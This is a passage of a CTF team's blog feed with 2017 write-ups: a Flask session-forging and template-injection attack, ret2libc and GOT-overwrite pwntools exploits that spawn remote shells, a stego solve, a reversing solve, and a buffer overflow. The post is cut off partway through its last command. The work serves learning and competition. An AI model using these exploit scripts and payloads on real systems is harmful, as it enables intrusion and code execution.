sysclass SimpleSecureCookieSessionInterface(SecureCookieSessionInterface): # Override method # Take secret_key instead of an instance of a Flask app def get_signing_serializer(self, secret_key): if not secret_key: return None signer_kwargs = dict( key_derivation=self.key_derivation, digest_method=self.digest_method ) return URLSafeTimedSerializer(secret_key, salt=self.salt, serializer=self.serializer, signer_kwargs=signer_kwargs)def decodeFlaskCookie(secret_key, cookieValue): sscsi = SimpleSecureCookieSessionInterface() signingSerializer = sscsi.get_signing_serializer(secret_key) return signingSerializer.loads(cookieValue)# Keep in mind that flask uses unicode strings for the# dictionary keysdef encodeFlaskCookie(secret_key, cookieDict): sscsi = SimpleSecureCookieSessionInterface() signingSerializer = sscsi.get_signing_serializer(secret_key) return signingSerializer.dumps(cookieDict)if __name__=='__main__': sk = '7h15_5h0uld_b3_r34lly_53cur3d' sessionDict = &#123;u'golem':sys.argv[1]&#125; cookie = encodeFlaskCookie(sk, sessionDict) decodedDict = decodeFlaskCookie(sk, cookie) print cookie We tried to read the flag.py via template python code but we failed hard, after that I stopped and decided to read about some global variables on flask documentation(http://flask.pocoo.org/docs/0.12/templating/), and we found a config global variable we included and the flag was in the dictionary attribute ‘flag’: 12345$ python manageFlaskSession.py \"&#123;&#123; config &#125;&#125;\"eyJnb2xlbSI6eyIgYiI6ImUzc2dZMjl1Wm1sbklIMTkifX0.DJeaSw.hiqTyJ7xj6WCZEX87xbKa48Bjkc$ curl 'https://golem.asisctf.com/golem' -H 'Cookie: session=eyJnb2xlbSI6eyIgYiI6ImUzc2dZMjl1Wm1sbklIMTkifX0.DJeaSw.hiqTyJ7xj6WCZEX87xbKa48Bjkc' --data ''&#123;--omited--,'flag':'ASIS&#123;I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!&#125;',--omited--&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"flask","slug":"flask","permalink":"https://teamrocketist.github.io/tags/flask/"},{"name":"pythonserver","slug":"pythonserver","permalink":"https://teamrocketist.github.io/tags/pythonserver/"},{"name":"ssti","slug":"ssti","permalink":"https://teamrocketist.github.io/tags/ssti/"},{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"},{"name":"sessionkey","slug":"sessionkey","permalink":"https://teamrocketist.github.io/tags/sessionkey/"},{"name":"cookies","slug":"cookies","permalink":"https://teamrocketist.github.io/tags/cookies/"}]},{"title":"[Pwn] ASIS - Mrs. Hudson","slug":"Pwn-ASIS-Mrs-Hudson","date":"2017-09-10T20:01:59.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/10/Pwn-ASIS-Mrs-Hudson/","link":"","permalink":"https://teamrocketist.github.io/2017/09/10/Pwn-ASIS-Mrs-Hudson/","excerpt":"","text":"Average: 2.94Rating Count: 17Top 3 Solver dodododo RPISEC TokyoWesternsPoints54Solves103CategoryPwnableDescription: England would fall if Mrs. Hudson leaves Baker Street. Mrs. Hudson is the first one who is totally exploited by Sherlock, or Does She? nc 178.62.249.106 8642 nc 146.185.168.172 8642 Lets start by checking the security of the binary (https://github.com/slimm609/checksec.sh): 123$ checksec -f ./mrs._hudsonRELRO STACK CANARY NX PIE RPATH RUNPATH FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH No 0 0 ./mrs._hudson We don’t have any kind of protections so analysing it with radare2 The binary is pretty simple we have a scanf in the end, with it we can overflow the buffer…My plan was: 123451 - overflow the buffer and leak puts address.2 - search in the libc-database for a libc.so.3 - calculate system address and binsh address.4 - jump to main again.5 - overflow the buffer and jump to system(&apos;/bin/sh&apos;). Calculate the offset to RIPWe can use metasploit(to create the patterns) and gdb but first lets see the address of the ret instruction in assembly: 123| 0x00400680 e89bfeffff call sym.imp.__isoc99_scanf ; int scanf(const char *format)| 0x00400685 c9 leave\\ 0x00400686 c3 ret And now generate the patterns and use gdb to calculate the offset 12345678910111213$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag$ gdb ./mrs._hudsonpwndbg&gt; b *0x00400686pwndbg&gt; rLet's go back to 2000.Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9pwndbg&gt; x $rsp0x7fffffffde08: 0x6541316541306541$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6541316541306541[*] Exact match at offset 120 The offset is 120. Leak puts addressWe have to leak the libc address from puts, we can do this by using puts_plt and puts_got addresses with return oriented programming, keep in mind that in x86 parameters are stored on the stack, but in x64 the first six parameters are saved in RDI, RSI, RDX, RCX, R8 and R9, if there are more parameters will be saved on the stack. So if we want to build the Rop chain to call puts we should first POP RDI RET so we save the next value in the stack to RDI. To find the POP RDI; RET gadget we can use ROPgadgets: 123456789101112131415$ ROPgadget --binary ./mrs._hudson --only \"pop|ret\"Gadgets information============================================================0x00000000004006ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ee : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006f0 : pop r14 ; pop r15 ; ret0x00000000004006f2 : pop r15 ; ret0x00000000004006eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ef : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400575 : pop rbp ; ret0x00000000004006f3 : pop rdi ; ret0x00000000004006f1 : pop rsi ; pop r15 ; ret0x00000000004006ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004ee : ret0x00000000004005a5 : ret 0xc148 Now start building our exploit to leak puts libc address: 1234567891011121314151617181920212223from pwn import *binary = ELF('./mrs._hudson')local = TruePOPRET = 0x00000000004006f3PUTSPLT = binary.plt['puts']PUTSGOT = binary.got['puts']padding = 'A' * 120ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"r = process('./mrs._hudson') if local else remote('178.62.249.106', 8642)r.recvline()r.sendline(padding + ropchain)PUTS = u64(r.recv(0x6).ljust(8, '\\x00'))log.info(\"PUTS 0x%x\" % PUTS) Search libc-databaseWe can user this libc-database and try to find a lib to corresponds to our puts leaked address: 1234567891011121314$ python mrs._hudson.py[*] &apos;~/ctf/asis/pwn/mrs._hudson&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments[+] Opening connection to 178.62.249.106 on port 8642: Done[*] Puts 0x7fc73fd10690$ ./find puts 0x7fc73fd10690 #libc-database folderubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu9_amd64)~/ctf/tokyo/pwn/swap/libc.so.6 (id local-14c22be9aa11316f89909e4237314e009da38883) It was funny because it was the same libc.so of a challenge I did previously in tokyo westerns. Calculate libcbase and other addressesNow that we have the lib.so.6 we can now use extract from it the offsets using pwntools: 1234567891011121314151617181920212223242526272829binary = ELF('./mrs._hudson')libc = ELF('libc.so.6') # got libc from libc-databaselocal = FalsePOPRET = 0x00000000004006f3PUTSPLT = binary.plt['puts']PUTSGOT = binary.got['puts']padding = 'A' * 120ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\"r = process('./mrs._hudson', env = &#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if local else remote('178.62.249.106', 8642)r.recvline()r.sendline(padding + ropchain)PUTS = u64(r.recv(0x6).ljust(8, '\\x00'))LIBCBASE = PUTS - libc.symbols['puts']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x18cd17log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"LIBC 0x%x\" % PUTS)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % (BINSH)) Return to main and jump to system(‘/bin/sh’)First lets get the main address from radare2: 12345678 ;-- main:/ (fcn) sym.main 109| sym.main ();| ; var int local_80h @ rbp-0x80| ; var int local_74h @ rbp-0x74| ; var int local_70h @ rbp-0x70| ; DATA XREF from 0x0040054d (entry0)| 0x0040061a 55 push rbp We add MAIN to our rop chain, after we execute puts, we jump to main again: 123456MAIN = 0x000000000040061Aropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\" And now the final exploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *import struct import timedef getConn(): return process('./mrs._hudson', env = &#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if local else remote('178.62.249.106', 8642)binary = ELF('./mrs._hudson')libc = ELF('libc.so.6') # got libc from libc-databaselocal = FalsePOPRET = 0x00000000004006f3PUTSPLT = binary.plt['puts']PUTSGOT = binary.got['puts']MAIN = 0x000000000040061Apadding = 'A' * 120ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\"r = getConn()r.recvline()r.sendline(padding + ropchain)PUTS = u64(r.recv(0x6).ljust(8, '\\x00'))LIBCBASE = PUTS - libc.symbols['puts']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x18cd17log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"PUTS 0x%x\" % PUTS)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % (BINSH))r.recvline()r.recvline()r.sendline(padding + p64(POPRET) + p64(BINSH) + p64(SYSTEM))r.interactive()r.close() Run and get the flag: 123456789101112131415161718192021222324252627$ python mrs._hudson.py[*] '~/ctf/asis/pwn/mrs._hudson' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments[*] '~/ctf/asis/pwn/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to 178.62.249.106 on port 8642: Done[*] LIBC 0x7ff6d2ec0000[*] PUTS 0x7ff6d2f2f690[*] SYSTEM 0x7ff6d2f05390[*] Binsh 0x7ff6d304cd17[*] Switching to interactive mode$ ls homefrontofficemanager$ ls home/frontofficemanagerflaghudson_3ab429dd29d62964e5596e6afe0d17d9$ cat home/frontofficemanager/flagASIS&#123;W3_Do0o_N0o0t_Like_M4N4G3RS_OR_D0_w3?&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"ret2libc","slug":"ret2libc","permalink":"https://teamrocketist.github.io/tags/ret2libc/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"asis2017","slug":"asis2017","permalink":"https://teamrocketist.github.io/tags/asis2017/"}]},{"title":"[Stego] ASIS - ASIS secret letter","slug":"Stego-ASIS-ASIS-secret-letter","date":"2017-09-10T18:10:59.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/09/10/Stego-ASIS-ASIS-secret-letter/","link":"","permalink":"https://teamrocketist.github.io/2017/09/10/Stego-ASIS-ASIS-secret-letter/","excerpt":"","text":"ASIS secret letterAverage: 4.17Rating Count: 6You Rated: 5Top 3 Solver Teamrocketist dcua CodiSecPoints202Solves17CategoryMisc StegoDescription: The face is the index of the mind, its ASIS secret letter! We have two images lets use binwalk on the jpg image: 1234567$ binwalk a.jpg DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0130 0x1E TIFF image data, big-endian, offset of first image directory: 856 0x38 Zlib compressed data, default compression Doesn’t look like it has something special so lets extract the files using binwalk again but with the parameter e: 123456$ binwalk -e a.jpgDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0130 0x1E TIFF image data, big-endian, offset of first image directory: 856 0x38 Zlib compressed data, default compression Binwalk will create a folder with extracted files: 12$ ls_a.jpg.extracted/38 38.zlib Checking the 38 file we can see we have a double encoded base64 string: 12$ cat 38 | base64 -d | base64 -d💌 from ASIS with love, please find secret message and reply soon, powered by 👉 Stéganô 👈⏎ Stéganô is a python package for steganography which can be found here https://github.com/cedricbonhomme/Stegano Now using stegano to extract something from png, there was two binaries in stegano we tried with stegano-lsb but it didn’t work so we tried with stegano-lsb-set with the generator triangular_numbers: 12$ Stegano/bin/stegano-lsb-set reveal -i e07d17ed7d8104590ff3e17bdf052057.png -g triangular_numbersASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125; And we got the flag!","categories":[{"name":"Stego","slug":"Stego","permalink":"https://teamrocketist.github.io/categories/Stego/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"binwalk","slug":"binwalk","permalink":"https://teamrocketist.github.io/tags/binwalk/"},{"name":"stego","slug":"stego","permalink":"https://teamrocketist.github.io/tags/stego/"},{"name":"stegano","slug":"stegano","permalink":"https://teamrocketist.github.io/tags/stegano/"}]},{"title":"[Pwn] Tokyo Westerns CTF 3rd 2017 - Swap","slug":"Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap","date":"2017-09-07T02:47:20.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/","link":"","permalink":"https://teamrocketist.github.io/2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/","excerpt":"","text":"The swapping is interesting. Let’s try!nc pwn1.chal.ctf.westerns.tokyo 19937swaplibc.so.6 We are given an 64 bit ELF for Linux x86-64: 12$ file swapswap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=74448e9fb5920898de1f9b5115c764eff1c8edac, not stripped We decompile it using ida’s pseudo c converter: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // eax@2 void *src; // [sp+20h] [bp-20h]@0 void *v5; // [sp+28h] [bp-18h]@0 char dest; // [sp+30h] [bp-10h]@7 initialize(); while ( 1 ) &#123; while ( 1 ) &#123; print_menu(); v3 = read_int(); if ( v3 != 1 ) break; puts(\"Please input 1st addr\"); src = (void *)read_ll(); puts(\"Please input 2nd addr\"); v5 = (void *)read_ll(); &#125; if ( v3 == 2 ) &#123; memcpy(&amp;dest, src, 8uLL); memcpy(src, v5, 8uLL); memcpy(v5, &amp;dest, 8uLL); &#125; else if ( !v3 ) &#123; puts(\"Bye.\"); exit(0); &#125; &#125;&#125;__int64 read_int()&#123; __int64 result; // rax@1 char buf; // [sp+10h] [bp-90h]@1 read(0, &amp;buf, 0x10uLL); result = atoi(&amp;buf); return result;&#125;__int64 read_ll()&#123; __int64 result; // rax@1 char buf; // [sp+10h] [bp-110h]@1 read(0, &amp;buf, 0x20uLL); result = atoll(&amp;buf); return result;&#125; Resuming what the program is actually doing: 123Option 1 - Choose two addressesOption 2 - Swap 2 addresses previously chosen (can be used to switch function addresses for example)Option 3 - Prints bye and exits The first thing we can start doing is to get the GOT(Global Offset Table) addresses of the functions we need, we can do this in 3 ways:objdump 1$ objdump -R swap readelf 1$ readelf -r swap pwntools 12345binary = ELF ( './swap' )ATOIGOT = binary.got['atoi']PUTSGOT = binary.got['puts']READGOT = binary.got['read']MEMCOPYGOT = binary.got['memcpy'] To get the PLT addresses we can either use objdump or pwntools againobjdump 1objdump -dj.plt swap pwntools 12binary = ELF ( './swap' )PUTSPLT = binary.plt['puts'] Now making a nice function to swap addresses in python : 12345678910def swap(address1, address2): print r.recvuntil('Your choice: \\n') send('1') print r.recvuntil('Please input 1st addr') send(str(address1)) print r.recvuntil('Please input 2nd addr') send(str(address2)) print r.recvuntil('Your choice: \\n') send('2') We can start by thinking into changing memcpy_got and read_got addresses, and why? because with this when we choose the option 2 to swap we will have something like this: 123read(&amp;dest, address1, 8uLL);read(address1, address2, 8uLL);read(address2, &amp;dest, 8uLL); The second read is what is interesting to us, we can controll the first two arguments to our advantage, if we choose the 1st address to be the file descriptor 0(STDIN) and the 2nd address the function we want to overwrite. 1read(0, ATOI_GOT, 0x8); // example: 1st arg: 0, 2nd arg: ATOI_GOT The next thing to do is to overwrite atoi function and why we want to do it? Because if we overwrite atoi into puts_plt we can leak addresses easily, because we first read them and then print them! 12read(0, &amp;buf, 0x10uLL);result = puts(&amp;buf); Now that we overwrite atoi with puts we can start trying to leak libc addresses like this: 1234print r.recvuntil('choice: \\n')r.send(\"B\")h = u64(r.recv(6).ljust(8, '\\x00')) # ljust will convert an address like 0x7f3253354340 into 0x0007f3253354340print \"STACK ADDRESS 0x%x\"%h Now we got a stack address but it’s still not the address we need, we have to calculate the offset of this address to the libcbase address! we can calculate this with help of gdb. Just run your python script (there will be a sleep of 5 seconds and attach the PID address on gdb like this: 123456789101112131415pwndbg&gt; attach 6865...outputfrompwngdb...pwndbg&gt; continuepwndbg&gt; p system$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fcb77dea391 &lt;system&gt;---------------runing-program-in-another-terminal---------------$ python swap.py..hidden-output...1. Set addrsses2. Swap both addrress of value0. ExitYour choice: STACK ADDRESS 0x7fcb7816a642 Now if we subtract the leaked address from the system address we got from gdb we will get and offset to system function: 12$ python -c \"print hex(0x7fcb7816a642 - 0x7fcb77dea391)\"0x3802b1 Adapting the python script: 123456789h = u64(r.recv(6).ljust(8, '\\x00'))print \"STACK ADDRESS 0x%x\"%haddr = h-0x3802b1- libc.symbols['system']LIBCBASE = addrSYSTEM = LIBCBASE + libc.symbols['system']#print r.recv(1024)log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"SYSTEM 0x%x\" % SYSTEM) We still have a small problem from now on, now that we overwrite the atoi we can’t really choose which option from the menu, well we actually can! puts returns the number of bytes printed! the null byte is included in this count! 12int i = puts(&apos;\\x00&apos;) // returns 1int i = puts(&apos;B\\x00&apos;) // returns 2 Now we give the input ‘B\\x00’ into puts so it will return the value 2! and we overwrite the atoi-&gt;puts-&gt;system and sent the “/bin/sh\\x00” string to get ourselves a shell!: 1234567r.send('a\\x00') # returns option 2 from putsprint r.recvuntil('choice: \\n')r.send(p64(SYSTEM)) # overwrites atoi -&gt; puts -&gt; systemprint r.recvuntil('choice: \\n')r.send('/bin/sh\\x00') # passes argument /bin/sh into system The full script is: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *from pwnlib.tubes import *from pwnlib.util.packing import *from pwnlib.tubes.process import *from pwnlib.tubes.remote import *import structimport timedef getConn(local): return process('./swap', env = &#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if local else remote('pwn1.chal.ctf.westerns.tokyo', 19937)def send(s): print s r.sendline(s)def swap(address1, address2): print r.recvuntil('Your choice: \\n') send('1') print r.recvuntil('Please input 1st addr') send(str(address1)) print r.recvuntil('Please input 2nd addr') send(str(address2)) print r.recvuntil('Your choice: \\n') send('2')local = Falsebinary = ELF ( './swap' )libc = ELF('./libc.so.6')PUTSPLT = binary.plt['puts']ATOIGOT = binary.got['atoi']PUTSGOT = binary.got['puts']READGOT = binary.got['read']MEMCOPYGOT = binary.got['memcpy']r = getConn(local)swap(MEMCOPYGOT,READGOT)swap(0,ATOIGOT)r.send(p64(PUTSPLT))print r.recvuntil('choice: \\n')r.send(\"B\")h = u64(r.recv(6).ljust(8, '\\x00'))print \"STACK ADDRESS 0x%x\"%haddr = h-0x3802b1- libc.symbols['system']LIBCBASE = addrSYSTEM = LIBCBASE + libc.symbols['system']#print r.recv(1024)log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"SYSTEM 0x%x\" % SYSTEM)r.send('a\\x00')print r.recvuntil('choice: \\n')r.send(p64(SYSTEM))print r.recvuntil('choice: \\n')r.send('/bin/sh\\x00')r.interactive()r.close() Running it 1234567891011121314151617181920$ python swap.py[*] '~/swap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[*] '~/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled...hidden-output...STACK ADDRESS 0x7fe5d8827642[*] LIBC 0x7fe5d8462001[*] SYSTEM 0x7fe5d84a7391...hidden-output...$ cat flagTWCTF&#123;SWAP_SAWP_WASP_PWAS_SWPA&#125; I didn’t solve this challenge in the CTF tournament I actually read this write ups(https://ctftime.org/writeup/7387 and https://github.com/sk4px/CTFs/blob/master/tw2017/swap.py) and did the challenge by myself after that.","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"swapaddresses","slug":"swapaddresses","permalink":"https://teamrocketist.github.io/tags/swapaddresses/"}]},{"title":"[Reverse] Tokyo Westerns CTF 3rd 2017 - Rev Rev Rev","slug":"Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev","date":"2017-09-04T01:25:49.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/09/04/Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev/","link":"","permalink":"https://teamrocketist.github.io/2017/09/04/Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev/","excerpt":"","text":"Rev Rev RevProblemrev_rev_rev Lets first disassemble the main function of the binary: Ignoring the MK_FP function which is related to the stack canaries protection on the executable we can see the program is reading from the STDIN into s and then modifies 4 modifications on the string using 4 functions: sub_80486B9(&amp;s);sub_80486DB(&amp;s);sub_8048738(&amp;s);sub_80487B2(&amp;s); Sub_80486B9 is just removing the new line in the end of the string by inserting a nullbyte on it (note that 10 or 0x0A in hex represents the \\n): 12345678char *__cdecl sub_80486B9(char *s)&#123; char *result; // eax@1 result = strchr(s, 10); *result = 0; return result;&#125; sub_80486DB is just reversing the string: 1234567891011121314151617181920char *__cdecl sub_80486DB(char *s)&#123; char v1; // ST17_1@2 char *result; // eax@3 char *v3; // [sp+8h] [bp-10h]@1 char *i; // [sp+Ch] [bp-Ch]@1 v3 = s; for ( i = &amp;s[strlen(s) - 1]; ; --i ) &#123; result = v3; if ( v3 &gt;= i ) break; v1 = *v3; *v3 = *i; *i = v1; ++v3; &#125; return result;&#125; sub_8048738 is performing a bunch of operation on the characters of the string some AND, OR and shifts 123456789101112131415161718int __cdecl sub_8048738(char *a1)&#123; char v1; // ST0B_1@2 unsigned __int8 v2; // ST0B_1@2 int result; // eax@3 char *i; // [sp+Ch] [bp-4h]@1 for ( i = a1; ; ++i ) &#123; result = (unsigned __int8)*i; if ( !(_BYTE)result ) break; v1 = 2 * (*i &amp; 0x55) | (*i &gt;&gt; 1) &amp; 0x55; v2 = 4 * (v1 &amp; 0x33) | (v1 &gt;&gt; 2) &amp; 0x33; *i = 16 * v2 | (v2 &gt;&gt; 4); &#125; return result;&#125; sub_80487B2 is flipping the bits of each byte using ~ operator 1234567891011121314int __cdecl sub_80487B2(_BYTE *a1)&#123; int result; // eax@3 _BYTE *i; // [sp+Ch] [bp-4h]@1 for ( i = a1; ; ++i ) &#123; result = *i; if ( !(_BYTE)result ) break; *i = ~*i; &#125; return result;&#125; We could rewrite this functions in python and apply it into the cipher string to get the real flag back! but thats too much work why don’t we insert the ciphertext to the binary and check if it spits the flag? lets do this with radare2: And we got the flag!!! Additionally I did a python script that interacts with radare2 using r2pipe which is a really cool python package, this script will automate what I did manually above doing a dynamic analysis: 12345678910111213141516171819202122232425import r2pipeimport structprofile = \"\"\"#!/usr/bin/rarun2program=./rev_rev_revstdin=output\"\"\"with open('profile.r2','w+') as f: print &gt;&gt;f, profilebuf = struct.pack (\"31B\", *[0x41,0x29,0xd9,0x65,0xa1,0xf1,0xe1,0xc9,0x19,0x09,0x93,0x13,0xa1,0x09,0xb9,0x49,0xb9,0x89,0xdd,0x61,0x31,0x69,0xa1,0xf1,0x71,0x21,0x9d,0xd5,0x3d,0x15,0xd5])with open('output','w+') as f: print &gt;&gt;f, bufr2=r2pipe.open('./rev_rev_rev')r2.cmd(\"e dbg.profile=profile.r2\")r2.cmd(\"doo\")r2.cmd(\"db 0x804866D\")r2.cmd(\"dc\")ciphertext = r2.cmd(\"pcp 31@ 0x8048870\")print r2.cmd(\"psz @ (ebp-0x2d)\") Running it 12$ python revrevrev.py 2&gt;/dev/null TWCTF&#123;qpzisyDnbmboz76oglxpzYdk&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"radare2","slug":"radare2","permalink":"https://teamrocketist.github.io/tags/radare2/"},{"name":"ida","slug":"ida","permalink":"https://teamrocketist.github.io/tags/ida/"}]},{"title":"[Pwn] Tokyo Westerns CTF 3rd 2017 - Just do it!","slug":"Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it","date":"2017-09-04T00:29:07.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/","link":"","permalink":"https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/","excerpt":"","text":"Just do it!ProblemDo it! Do it!nc pwn1.chal.ctf.westerns.tokyo 12345(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)just_do_it Starting by De-assembler with ida and use its ability to some c pseudo code: 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [sp+8h] [bp-20h]@7 FILE *stream; // [sp+18h] [bp-10h]@1 char *v6; // [sp+1Ch] [bp-Ch]@1 setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 2, 0); v6 = failed_message; stream = fopen(\"flag.txt\", \"r\"); if ( !stream ) &#123; perror(\"file open error.\\n\"); exit(0); &#125; if ( !fgets(flag, 48, stream) ) &#123; perror(\"file read error.\\n\"); exit(0); &#125; puts(\"Welcome my secret service. Do you know the password?\"); puts(\"Input the password.\"); if ( !fgets(&amp;s, 32, stdin) ) &#123; perror(\"input error.\\n\"); exit(0); &#125; if ( !strcmp(&amp;s, PASSWORD) ) v6 = success_message; puts(v6); return 0;&#125; We can see clearly there is a buffer overflow problem on strcmp PASSWORD comes from STDIN, if we give a password greater than the variable s can handle, we will overflow in this one we don’t even need to modify the ret address. We can just modify the address from v6 to the flag variable address! which is stored from a file “flag.txt” in the server. First lets just discover the offset we could know this by looking at the assembly code and check how space was saved in the stack for this variable by looking the offset from ebp or we can just use gdb with some help from metasploit to generate patterns: 12345678910$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab$ gdb ./justdoitpwndbg&gt; rStarting program: /home/evilgod/Documents/Hacking/ctf/tokyo/pwn/justdoit/just Welcome my secret service. Do you know the password?Input the password.Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5AbProgram received signal SIGSEGV (fault address 0x37614136) We can see it broke at address 0x37614136 we again can calculate it in metasploit with pattern_offset 12$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37614136[*] Exact match at offset 20 Now we can see we need to add more than 20 characters to overflow! now lets use IDA to get the address where is stored our flag: And finally writing a script: 123FLAG = 0x0804A080payload = 'A' *20 + struct.pack('&lt;L',FLAG)print payload getting the flag….1234$ python justdoit.py | nc pwn1.chal.ctf.westerns.tokyo 